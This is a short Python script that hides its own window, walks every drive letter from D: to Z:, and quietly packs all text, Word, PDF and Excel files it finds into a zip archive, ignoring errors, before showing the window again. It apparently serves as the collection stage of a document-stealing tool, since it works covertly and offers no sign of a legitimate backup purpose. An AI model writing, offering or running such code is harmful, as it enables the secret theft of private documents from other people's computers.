import os , win32gui , win32con
from zipfile import ZipFile
Lists = ['D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)
zips = ZipFile("main.zip" , "w")
for i in Lists:
    pasvand = {".txt" ,".docx" ,".pdf" ,".xlsx"}
    try:
        for dirname , dirpaths , filenames in  os.walk(str(i)+":\\"):
            for filename in filenames:
                ext = os.path.splitext(filename)[-1]
                if ext in pasvand:
                    x = os.path.join(dirname, filename)
                    zips.write(str(x))                 
    except:
        pass
zips.close()
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)
